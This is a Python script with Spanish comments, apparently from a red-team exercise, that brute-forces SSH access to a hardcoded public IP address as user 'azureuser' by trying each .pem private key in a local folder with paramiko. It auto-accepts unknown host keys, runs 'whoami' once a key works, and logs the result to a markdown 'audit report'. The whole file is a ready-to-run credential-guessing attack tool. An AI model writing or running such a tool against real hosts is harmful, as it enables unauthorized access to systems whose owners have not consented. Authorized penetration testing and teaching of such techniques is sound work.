import paramiko
import os
import time
from datetime import datetime

# Atributos a usar en el ataque 
HOSTNAME = "20.97.176.130"
USER = "azureuser"
# ruta donde se encuentra la carpeta con el contenido de las llaves
FOLDER_KEYS = "red_team\mis_llaves" 

#Generación del archivo reporte
carpeta_Reportes = "---Reporte Ataque SSH----"
if not os.path.exists(carpeta_Reportes):
    os.mkdir(carpeta_Reportes)
    print("Carpeta creada")
else:
    print("La carpeta ya existe")

#Marca del tiempo y ruta del archivo fijada a report.md
timestamp = datetime.now().strftime("%Y-%m-%d %H-%M-%S")
ruta_reporte = os.path.join(carpeta_Reportes, "report.md")

#funcion de guardado
def guardarreporte(texto):
    with open(ruta_reporte, "a", encoding="utf-8") as reporte:
        reporte.write(texto + "\n")

#Inicialización del reporte
guardarreporte("# REPORTE DE AUDITORIA - ATAQUE RED TEAM")
guardarreporte(f"**Fecha y hora de inicio:** {timestamp}")
guardarreporte(f"**HOST objetivo:** {USER}@{HOSTNAME}")
guardarreporte("---")

def brute_force_keys():
    #listado de los archivos a analizar
    #si no encuentra el archivo realiza un print correspondiente
    if not os.path.exists(FOLDER_KEYS):
        error_msg = f"[!] La carpeta {FOLDER_KEYS} no existe."
        print(error_msg)
        guardarreporte(f"!ERROR:! {error_msg}")
        return

    llaves = [f for f in os.listdir(FOLDER_KEYS) if f.endswith('.pem')]
    msg_inicio = f"[*] Iniciando ataque. Se probarán {len(llaves)} llaves..."
    print(msg_inicio + "\n")
    guardarreporte(f"\n Inicio:Fase de Fuerza Bruta\n{msg_inicio}")

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    encontrado = False
    
    #comienza el análisis de los archivos que contienen las llaves
    for nombre_llave in llaves:
        ruta_completa = os.path.join(FOLDER_KEYS, nombre_llave)
        
        try:
            print(f"[-] Probando llave: {nombre_llave}...", end="\r")
            #conexión ssh
            client.connect(
                hostname=HOSTNAME,
                username=USER,
                key_filename=ruta_completa,
                timeout=5
            )
            
            #salida si se hayaron coincidencias
            exito_msg = f"\n\n[+] ¡ACCESO CONCEDIDO!\nLa llave correcta es: {nombre_llave}"
            print(exito_msg)
            
            #Registro de éxito en el reporte
            guardarreporte(f"\n### [!] ÉXITO")
            guardarreporte(f"-LLave con coincidencia:`{nombre_llave}`")
            
            #funciones de paramiko el client.exec command envia el comando whoami al host que se conecta
            stdin, stdout, stderr = client.exec_command("whoami")
            usuario_sistema = stdout.read().decode().strip()
            
            print(f"Usuario en el sistema: {usuario_sistema}") # muestra info legible
            guardarreporte(f"-Usuario confirmado:`{usuario_sistema}`")
            
            #stdin, stdout, stderr son los estandares a responder 
            client.close()
            encontrado = True
            break #Detener el ataque porque ya entramos
            
        #trato de errores para que no pare y siga intentando la verificacion 
        except paramiko.AuthenticationException:
            continue
        except Exception as e:
            print(f"\n[!] Error con {nombre_llave}: {e}")
            guardarreporte(f"-!Aviso!: Error probando `{nombre_llave}`: {e}")

    if not encontrado:
        guardarreporte("\nRESULTADO\nNo se encontró ninguna llave válida en el conjunto proporcionado.")

    guardarreporte("\n---\n**Fin del reporte.**")

#ejecuta el codigo 
if __name__ == "__main__":
    brute_force_keys()